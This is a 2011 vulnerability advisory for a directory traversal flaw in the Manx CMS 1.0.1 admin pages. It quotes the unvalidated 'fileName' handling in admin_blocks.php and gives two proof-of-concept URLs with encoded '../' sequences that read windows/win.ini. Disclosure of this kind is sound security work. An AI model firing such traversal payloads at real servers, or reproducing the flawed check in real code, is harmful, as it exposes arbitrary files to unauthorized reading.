@@ -1,0 +1,63 @@
+
+Manx cms.xml 1.0.1 (simplexml_load_file()) Directory Traversal Vulnerability
+
+
+Vendor: Paul Jova
+Product web page: http://manx.jovascript.com
+Affected version: 1.0.1
+
+Summary: Manx is a Content Management System that uses xml
+text files to store the page contents, instead of a mysql
+database.
+
+Desc: Input passed via the 'fileName' parameter thru the
+simplexml_load_file() function is not properly verified
+in '/admin/admin_blocks.php' and '/admin/admin_pages.php'
+(post-auth) before being used to load files. This can be
+exploited to disclose the contents of arbitrary files via
+directory traversal attacks.
+
+
+==============================================================
+/admin/admin_blocks.php:
+--------------------------------------------------------------
+
+20: if ( isset($_REQUEST['fileName']) && ($_REQUEST['fileName'] !== '') && strstr($_REQUEST['fileName'], 'Dir') == false )
+21: {
+22:     $fileName = $_REQUEST['fileName'];
+23: }
+24: else $fileName = $new_file;
+
+...
+...
+
+193: if ( ($fileName != '') && (file_exists($pathAdminToBlocks . $fileName)) )
+194: {
+195:    $simple_element = simplexml_load_file($pathAdminToBlocks . $fileName);
+
+==============================================================
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.21
+           MySQL 5.5.16
+           PHP 5.3.8
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2011-5060
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5060.php
+
+
+
+27.11.2011
+
+
+PoC:
+
+
+http://localhost/admin/admin_blocks.php?editorChoice=none&fileName=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
+http://localhost/admin/admin_pages.php?editorChoice=none&fileName=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini
